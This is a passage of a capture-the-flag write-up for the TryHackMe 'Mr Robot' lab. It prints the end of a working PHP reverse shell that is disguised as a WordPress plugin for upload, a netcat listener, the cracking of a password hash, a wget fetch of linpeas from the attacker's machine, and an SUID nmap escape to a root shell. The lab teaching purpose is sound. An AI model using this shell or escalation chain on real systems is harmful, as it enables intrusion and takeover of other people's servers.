Do the reverse shell...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Open reverse connection</span></span><br><span class="line">$sock = fsockopen($ip, $port, $errno, $errstr, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!$sock) &#123;</span><br><span class="line">printit(<span class="string">"$errstr ($errno)"</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spawn shell process</span></span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"r"</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$process = proc_open($shell, $descriptorspec, $pipes);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_resource($process)) &#123;</span><br><span class="line">printit(<span class="string">"ERROR: Can't spawn shell"</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set everything to non-blocking</span></span><br><span class="line"><span class="comment">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span></span><br><span class="line">stream_set_blocking($pipes[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking($pipes[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking($pipes[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking($sock, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">printit(<span class="string">"Successfully opened reverse shell to $ip:$port"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// Check for end of TCP connection</span></span><br><span class="line"><span class="keyword">if</span> (feof($sock)) &#123;</span><br><span class="line">printit(<span class="string">"ERROR: Shell connection terminated"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check for end of STDOUT</span></span><br><span class="line"><span class="keyword">if</span> (feof($pipes[<span class="number">1</span>])) &#123;</span><br><span class="line">printit(<span class="string">"ERROR: Shell process terminated"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line"><span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line">$read_a = <span class="keyword">array</span>($sock, $pipes[<span class="number">1</span>], $pipes[<span class="number">2</span>]);</span><br><span class="line">$num_changed_sockets = stream_select($read_a, $write_a, $error_a, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line"><span class="comment">// data to process's STDIN</span></span><br><span class="line"><span class="keyword">if</span> (in_array($sock, $read_a)) &#123;</span><br><span class="line"><span class="keyword">if</span> ($debug) printit(<span class="string">"SOCK READ"</span>);</span><br><span class="line">$input = fread($sock, $chunk_size);</span><br><span class="line"><span class="keyword">if</span> ($debug) printit(<span class="string">"SOCK: $input"</span>);</span><br><span class="line">fwrite($pipes[<span class="number">0</span>], $input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the process's STDOUT</span></span><br><span class="line"><span class="comment">// send data down tcp connection</span></span><br><span class="line"><span class="keyword">if</span> (in_array($pipes[<span class="number">1</span>], $read_a)) &#123;</span><br><span class="line"><span class="keyword">if</span> ($debug) printit(<span class="string">"STDOUT READ"</span>);</span><br><span class="line">$input = fread($pipes[<span class="number">1</span>], $chunk_size);</span><br><span class="line"><span class="keyword">if</span> ($debug) printit(<span class="string">"STDOUT: $input"</span>);</span><br><span class="line">fwrite($sock, $input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the process's STDERR</span></span><br><span class="line"><span class="comment">// send data down tcp connection</span></span><br><span class="line"><span class="keyword">if</span> (in_array($pipes[<span class="number">2</span>], $read_a)) &#123;</span><br><span class="line"><span class="keyword">if</span> ($debug) printit(<span class="string">"STDERR READ"</span>);</span><br><span class="line">$input = fread($pipes[<span class="number">2</span>], $chunk_size);</span><br><span class="line"><span class="keyword">if</span> ($debug) printit(<span class="string">"STDERR: $input"</span>);</span><br><span class="line">fwrite($sock, $input);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose($sock);</span><br><span class="line">fclose($pipes[<span class="number">0</span>]);</span><br><span class="line">fclose($pipes[<span class="number">1</span>]);</span><br><span class="line">fclose($pipes[<span class="number">2</span>]);</span><br><span class="line">proc_close($process);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Like print, but does nothing if we've daemonised ourself</span></span><br><span class="line"><span class="comment">// (I can't figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printit</span> <span class="params">($string)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!$daemon) &#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$string\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>We need this part at the top:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Plugin Name:  Shelldon</span></span><br><span class="line"><span class="comment">Plugin URI: http://example.com</span></span><br><span class="line"><span class="comment">Description: Makes a Shelldon</span></span><br><span class="line"><span class="comment">Version: 1.0</span></span><br><span class="line"><span class="comment">Author: me</span></span><br><span class="line"><span class="comment">Author URI: http://www.me.com</span></span><br><span class="line"><span class="comment">Text Domain: revshell</span></span><br><span class="line"><span class="comment">Domain Path: /languages</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>I honestly don’t know what it does exactly but it makes it look like a WordPress plugin and only that way we can upload it.</p><p>So let’s do just that, upload our plugin, but don’t activate it yet. Before that, we have to listen for incoming connections with netcat on our machine.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 9999</span><br></pre></td></tr></table></figure><p>Now if we activate the plugin in the WordPress interface, the page should be stuck in a loading loop, and we should have a reverse shell in the terminal we started the netcat listener in.</p><p>This shell is not really stable and we can’t use our arrows or autocomplete, so I am going to be using some poor man’s pentest and use the stabilizeshell.sh script. (If you don’t know what I am talking about, check out this video <a href="https://www.youtube.com/watch?v=f2aSXGbD0NE" target="_blank" rel="noopener">here</a>)<br>That way we can use all the nice features of a shell.</p><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h2><h3 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag 2"></a>Flag 2</h3><p>With the new shell we can also easily see that we are connected as the “daemon” user, so let’s see if we have some home directories.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">daemon@linux:/$ <span class="built_in">cd</span> home/</span><br><span class="line">daemon@linux:/home$ ls</span><br><span class="line">robot</span><br><span class="line">daemon@linux:/home$ <span class="built_in">cd</span> robot/</span><br><span class="line">daemon@linux:/home/robot$ ls</span><br><span class="line">key-2-of-3.txtpassword.raw-md5</span><br></pre></td></tr></table></figure><p>We can see that there is another user called “robot” on this machine and he has a home. In there he has to files. A key, which we can sadly not cat out because it is owned by “robot”. So we do not have access to it. But there is something else interesting.<br>An md5 hash of a password, which we luckily can cat out.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">daemon@linux:/home/robot$ cat password.raw-md5</span><br><span class="line">robot:c3fcd3d76192e4007dfb496cca67e13b</span><br></pre></td></tr></table></figure><p>I was too lazy to do anything fancy in hashcat or john, so I just used <a href="https://crackstation.net/" target="_blank" rel="noopener">crackstation.net</a>, it gives us the result way faster:</p><img src="/2020/07/09/Mr-Robot-TryHackMe/crackstation.png" class="" title="Crackstation"><p>Now that we have his credentials, let’s login as “robot”</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su robot</span><br></pre></td></tr></table></figure><p>(And of course type in the password we just found)</p><p>Cool, we are now “robot”, means that we now have access to the second key.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">daemon@linux:/home/robot$ cat key-2-of-3.txt</span><br><span class="line">key2</span><br></pre></td></tr></table></figure><h2 id="Getting-Root"><a href="#Getting-Root" class="headerlink" title="Getting Root"></a>Getting Root</h2><p>Now that we have a user with more privileges we should try and get ourselves root. For that, I got <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS" target="_blank" rel="noopener">linpeas</a> on the target machine.<br>I did that by using my machine as a server and downloading linpeas from my machine. (You could also just directly download linpeas to be honest but I did it that way)</p><p>To open up the server (Do that on <strong>your</strong> computer):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure><p>Download files (Do that on the <strong>target</strong> machine):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /dev/shm/</span><br><span class="line">wget <span class="string">"<span class="variable">$YOURIP</span>:8000/linpeas.sh"</span></span><br></pre></td></tr></table></figure><p>($YOURIP is your tun0 ip that shows up if you run ifconfig)</p><p>Now mark linpeas.sh as an executable</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x linpeas.sh</span><br></pre></td></tr></table></figure><p>And run and save it</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linpeas.sh | tee linout.txt</span><br></pre></td></tr></table></figure><p>As usual, linpeas found a shitload of things but something that stood out to me was the “nmap” entry in the SUID section.</p><p>A quick search on <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a> shows us that a root shell is just a few lines of code away.</p><img src="/2020/07/09/Mr-Robot-TryHackMe/gtfobins.png" class="" title="GTFOBins"><p>I used the second option, so spawn an interactive nmap shell and get a root shell.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure><p>And there you go, you have a root shell! I didn’t stabilize it this time, just because we don’t work in it very long.</p><h3 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag 3"></a>Flag 3</h3><p>Now we can have a look inside of the /root/ directory and we see the third key.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># whoami</span><br><span class="line">root</span><br><span class="line"># pwd</span><br><span class="line">&#x2F;root&#x2F;</span><br><span class="line"># cat key-3-of-3.txt</span><br><span class="line">key3</span><br></pre></td></tr></table></figure><h2 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h2><p>And there you have it! I hope you had fun, I know I did 🦄</p>]]></content>
      
      
      <categories>
          
          <category> pentesting </category>
          
          <category> writeups </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
